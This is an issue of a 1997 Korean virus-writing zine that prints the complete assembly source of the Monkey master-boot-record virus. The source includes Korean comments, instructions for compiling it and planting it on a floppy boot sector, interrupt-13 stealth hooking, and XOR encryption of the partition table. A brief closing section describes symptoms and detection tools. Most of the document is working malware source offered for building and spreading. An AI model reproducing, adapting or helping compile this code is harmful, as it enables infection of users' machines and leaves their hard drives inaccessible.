
 VBB Corean Edition

  Virus 특집 Monkey Virus.                                      CVC #02  97/09
  ------------------------

이번장에는 혁신적인 감염 형태를 지닌 몽키 바이러스에 대해 다룰것입니다
몽키 바이러스는  메모리에 상주할때 파티션 테이블을 다른 곳으로 옮기고
읽기만 가능하게 합니다 이것은 바이러스 제거를 아주 어렵게 만듭니다 
좀더 자세한 설명은 소스코드 마지막에 실어 놓았읍니다

       페이지  70,80
       이름    Monkey

;*******************************************************************
;
;  몽키바이러스는 챔피언시 에드몬튼에 사는 UACVRS 
;  에의해  1992년 1월 만들어 졋읍니다.
;
;  몽키는 마스터부트색터나 도스 부트색터에 자신을 복사합니다
;  하드디스크 파티션을 다른곳에 저장해놓지 않읍니다     
;  컴퓨터가 감염되면 플로피 디스크로만 부팅이 가능합니다
;  c 드라이브는 더이상 접근할수가 없읍니다
;     
;  컴파일 하려면 : masm monkey     (저희는 MASM 5.0 를 사용했읍니다)
;                  link monkey
;                  exe2bin monkey.exe monkey.co
;     NU 나 debug 를 사용해 몽키바이러스를 플로피 디스켓의 부트섹터
;     로 복사합니다. 디스켓은 부트되지가 않지만 자체적으로 하드 
;     드라이브에 인스톨 될것입니다 
;
;     버그 ;1.44meg보다 큰 플로피 디스켓은 모두 쓰레기기 될것이다
;            크게 생각치 않아도 된다
;
;*********************************************************************

Code   Segment
       Assume  CS:Code,DS:CODE,ES:CODE
       ORG     00H

MAIN:
       JMP     INITIAL

; 1fh 상위의 공간은 플로피 디스크를 위한 공간이다

       ORG     1FH
INT_13     EQU     THIS BYTE

          PUSH    DS
          PUSH    SI
          PUSH    DI
          PUSH    AX
          PUSH    CX
          PUSH    DX

          CALL    SET_HEAD                  ;

          CMP     AH,02H                    ; 읽기 인가 ?
          JNZ     END_ACTION

          PUSH    DX
          SUB     AX,AX
          INT     1AH

TIME      EQU $ + 2
          CMP     DL,40H
          POP     DX
          JNB     END_ACTION

          CALL HANDLE_DISK

END_ACTION:
          POP   DX
          POP   CX
          POP   AX
          POP   DI

          PUSH  DX
          PUSH  CX
          PUSH  AX

          CMP   CX,03H                      ; SECTOR 가 3보다 작은가
          JNB   EXIT_2                      ; 아니면 빠진다

          CMP   DH,BYTE PTR DS:[SI]         ; 헤드가 맞는가?
          JNZ   EXIT_2                      ; 아니면 빠진다

          CMP   AH,02H                      ; 읽기 모드인가 ?
          JZ    STEALTH                     ; 그러면 STEALTH 로 간다

          CMP   AH,03H                      ; 쓰기 모드인가 ?
          JNZ   EXIT_2                      ; 아니면 빠진다
                                            ; 맞으면
          CMP   DL,80H                      ; 하드드라이브 인가?
          JB    EXIT_2                      ; 아니면 빠진다

          SUB   AH,AH                       ; 디스크 리셋 - HD 가 깜빡거린다
          JMP   SHORT EXIT_2                ; 빠진다
STEALTH:
          CALL  INT13                       ; 읽기
          JB    EXIT_3                      ; 에러인가?

          CALL  COMP_SIG                    ; 내표식이 있는가?
          JZ    REDIRECT                    ; 있으면, REDIRECT로 간다

          CALL  COMP_PA                     ; 파와 비교한다?
          JZ    REDIRECT                    ; 맞으면, REDIRECT로

EXIT_0:
          CLC                               ; 아니면 플레그 샛트
          JMP   SHORT EXIT_3                ; 빠진다
          
REDIRECT:

          CALL  CHSEC                       ; 섹터 계산

          MOV   DH,BYTE PTR DS:[SI+1]       ; HEAD 를 셋트한다

          POP   AX                          ; AX 를 복구한다
          CALL  INT13                       ; 다시 읽는다
          CALL  ENCRPT_PBR
          POP   CX                          ; CX, DX를 복구한다
          POP   DX
          JMP   SHORT EXIT_4                ; 빠진다
EXIT_2:
          CALL  INT13
EXIT_3:
          POP   DS
          POP   DS
          POP   DS
EXIT_4:
          POP   SI
          POP   DS
          RETF  0002H

READ_SEC_1:
          MOV   AX,0201H                    ; 읽는다
INT13 PROC NEAR
          PUSHF
          CALL  DWORD PTR CS:INT13_ADDR     ;***********
          RET
INT13 ENDP

HOOK_ENTRY   EQU  THIS BYTE
HOOK:
          INT   12H
          MOV   SI,004CH
          PUSH  SI
          CMP   BYTE PTR CS:HOME_SEC,02H       
          JZ    SETUP_SPECIAL

SETUP_NORMAL:

          CALL  SHIFT_NORMAL

          MOV   DI,OFFSET INT13_ADDR
          MOV   CX,0002H
          CLD
          REPZ  MOVSW

          JMP   SHORT STORE_SEGMENT

SETUP_SPECIAL:

          CALL  SHIFT_SPECIAL

STORE_SEGMENT:
          POP   SI
          MOV   WORD PTR DS:[SI],OFFSET INT_13  
          MOV   DS:[SI+2],AX                ; 세그먼트 저장

PATCH_OVER:

          PUSH  CS
          POP   DS
          CALL  PATCH           
          PUSH  ES                          ; SEGMENT 저장
          MOV   AX,OFFSET JMP_ADDR
          PUSH  AX                          ; ADDRESS 저장
          STI
          RETF                              ; FAR JMP

    JMP_ADDR   EQU THIS BYTE
BOOT:
          MOV   ES,CX
          MOV   BX,SP                       ; 0000:7C00
          PUSH  CX                          ; JMP SEGMENT 저장
          PUSH  BX

          MOV   DX,0080H                    ;  C: 핸들
          CALL  SET_HEAD
          CALL  HANDLE_DISK

BOOT_SEC  EQU $ + 1
          MOV   CL,05H                      ; SECTOR 3 에서   ????

BOOT_DISK  EQU $ + 1
          MOV   DX,0100H                    ; C:, HEAD 0      ????

          CALL  READ_SEC_1                  ; INT 13

          CALL  ENCRPT_PBR

          RETF

HANDLE_DISK PROC NEAR

          ; *** SECTOR 1를 읽는다 ***
          SUB   CX,CX
          INC   CX
          PUSH  CX

          MOV   DH,[SI]                     ; HEAD
          CALL  READ_SEC_1                  ; INT 13
          JB    END_HANDLE_DISK             ; ERROR -> END

          ; *** 비교 ***
          CALL  COMP_SIG
          JZ    E_2                         ; 같으면-> 저절로 갱신된다

          ; *** PA?  ***
          CALL  COMP_PA                  
          JNZ   UPDATE_DISK              

          ; *** OK?  ***
          INC   CX
          CMP   WORD PTR ES:[BX+1FAH],00H 
          JZ    E_2                         ; 같으면 -> 스스로 갱신

          MOV   WORD PTR ES:[BX+1FAH],00H   ; 0으로 셋트한다
          MOV   CL,1H                       ; sector 1 에 값을 바꾼다
          CALL  WRITE_SEC_1                 ;
          JB    END_HANDLE_DISK

          ; *** 맞으면 섹터 2 를 읽는다 ***
          INC   CX                      ; Pagette 의디스크 보안은 sector 1 있다
          MOV   DH,[SI+2]                   ; 내 표식은 sector 2 에 있다
          CALL  READ_SEC_1                  ; INT 13
          JB    END_HANDLE_DISK             ; 에러면 빠진다
          POP   AX
          PUSH  CX

UPDATE_DISK:
          CALL  CHSEC                       ; CL 를 위해 섹터 계산
          CALL  ENCRPT_PBR
          INC   SI
          CALL  WRITE_SEC_1
          DEC   SI
          JB    END_HANDLE_DISK

          CALL  ENCRPT_PBR
          PUSH  CX
          CALL  PATCH
          POP   CX

          PUSH  DX
          CMP   DL,80H
          JNB   E_1
          XOR   DL,DL
E_1:
          MOV   WORD PTR ES:[BX+BOOT_DISK],DX
          POP   DX
          MOV   BYTE PTR ES:[BX+BOOT_SEC],CL
          POP   CX
          PUSH  CX
          MOV   BYTE PTR ES:[BX+OFFSET HOME_SEC],CL
          MOV   WORD PTR ES:[BX+OFFSET BOOT_SIG],0AA55H

E_2:
          CALL  WRITE_SEC_1

END_HANDLE_DISK:
          POP   AX
          RET

HANDLE_DISK ENDP

WRITE_SEC_1 PROC NEAR
          MOV  DH,[SI]
WRITE_SEC_2:
          MOV  AX,0301H
          CALL INT13
          RET
WRITE_SEC_1 ENDP

COMP_SIG PROC NEAR
   CMP     ES:[BX+OFFSET PROG_SIG],9219H
   RET
COMP_SIG   ENDP

COMP_PA PROC NEAR
   CMP   WORD PTR ES:[BX+119H],6150H   ; PA?
   RET
COMP_PA    ENDP

HOME_SEC    DB     01H

FLOPPY_HEAD DB     00H,01H,01H
HARD_HEAD   DB     00H,00H,00H

                  ;  360 720 1.2 1.44
FLOP_SECT_TABLE   DB  02H,05H,09H,0BH
SAVE_SECT_TABLE   DB  03H,05H,0EH,0EH

CHSEC PROC NEAR
   PUSH    DI
   PUSH    SI
   MOV     AL,ES:[BX+14H]
   MOV     CX,0004H
CHSEC_1:
   MOV     SI,CX
   DEC     SI
   CMP     FLOP_SECT_TABLE[SI],AL
   JZ      CHSEC_END_1
   LOOP    CHSEC_1
   MOV     CL,03H
   JMP     SHORT CHSEC_END_2
CHSEC_END_1:
   MOV     CL,SAVE_SECT_TABLE[SI]
CHSEC_END_2:
   POP     SI
   POP     DI
   RET
CHSEC      ENDP

SHIFT_NORMAL PROC NEAR
 ; FIND THE SEGMENT TO HIDE
    DEC    AX
    MOV    DS:[413H],AX

SHIFT_SPECIAL:
    MOV    CL,06H
    SHL    AX,CL
    ADD    AL,20H
    MOV    ES,AX
    RET
SHIFT_NORMAL     ENDP

PATCH PROC NEAR         ; int_13 를 통해 부트 섹터를 감염시킨다
    PUSH  SI
    MOV   DI,BX
    MOV   SI,OFFSET INT_13
    ADD   DI,SI
;   CLD
    MOV   CX,OFFSET PROG_END - OFFSET INT_13
    REPZ  MOVSB

PATCH_JMP:
    MOV   DI,BX

    SUB   SI,SI
    MOV   CL,3H
    REPZ  MOVSB

    POP   SI
    RET
PATCH     ENDP

SET_HEAD PROC NEAR
    PUSH  CS
    POP   DS

    MOV   SI,OFFSET FLOPPY_HEAD
    CMP   DL,80H
    JB    SET_HEAD_EXIT
    MOV   SI,OFFSET HARD_HEAD
SET_HEAD_EXIT:
    RET
SET_HEAD  ENDP

INITIAL:
      CLI
      SUB   BX,BX
      MOV   DS,BX
      MOV   SS,BX
      MOV   SP,7C00H
      JMP   HOOK
      NOP
      NOP

ENCRPT_PBR:
      PUSH    DI
      PUSH    CX
      PUSH    AX

      MOV     DI,BX
      MOV     CX,200H

      CLD
ENCRPT_1:
      MOV     AL,ES:[DI]
ENCRPT_CODE   EQU $ + 0001H
      XOR     AL,2EH
      STOSB
      LOOP    ENCRPT_1

      POP     AX
      POP     CX
      POP     DI
      RET


             ORG 01F4H
;PROG_NAME   DB     "Monkey"
PROG_NAME   DB     6dh,8fh,8eh,8bh,85h,99h

             ORG 01FAH
PROG_SIG    DB     19H,92H

PROG_END    EQU   THIS BYTE

            ORG 01FCH
INT13_ADDR  DB     00H,00H

            ORG 01FEH
BOOT_SIG    DB     55H,0AAH
PROG_TAIL   EQU   THIS BYTE

PROG_LEN    EQU   OFFSET PROG_END - OFFSET INT_13


CODE      ENDS
      END MAIN

-----------------------------------------------
세로운 바이러스의 등장      1992년 7월 9일

몽키 바이러스
몽키바이러스는 엠파이어 디  바이러스에서 파생된 메인 부트색터 감염
바이러스 이다 . 몽키바이러스는 2개의 틀린점이 있읍니다 
컴퓨터가 보안프로그램을 가동시키고 있다할지 라도 눈에 뛸만한 변화를
보이지 않기 때문에 컴퓨터에 바이러스를 감염 시킬수가 있읍니다
감염 증상으로는 플로피 디스크로 부팅을 할때 하드드라이브를 인식하지
못하게 합니다 . 총 메모리가 1024 바이트 감소 합니다


바이러스 찾기

가장 간단한 방법은 메모리가 1킬로 감소 하지 않았나 알아 보는 것이다
도스 명령어인 chkdsk와 mem은 평상시 보다 메모리가 1 킬로 적다는 것을
알려줄 것입니다

인기있는 바이러스 검색 프로그램인 f-port 버전 2.04로검색 하면 stoned
의 세로운 변종으로 표시 됩니다 . f-port는 메모리 상의 바이러스만 검색
하고 몽키바이러스가 부트 할떼는 잡아 내지 못합니다.

Monkey 바이러스를 찾아내고 없애려면 알베르타 대학에서 만든 
KILLMONK 프로그램을 사용 하면 됩니다


-----BEGIN PGP SIGNATURE-----
Version: 2.6.3ia
Charset: cp850
Comment: Reviewed by Editor

iQB1AwUBMU7VSZUWxCqisaIxAQFn/QL5Af3CQHSi+k9P7GgluyjP4DfX7mq8HXq+
/ubZFacNBAmoIlp/yJkBTxRYLn1eeW25JyMVCI7MavShe3zEj34xUz/0o9whFmxD
Dkj89+mdbFiH1dNaN1C3A9Y+hlhEmuHx
=OilF
-----END PGP SIGNATURE-----
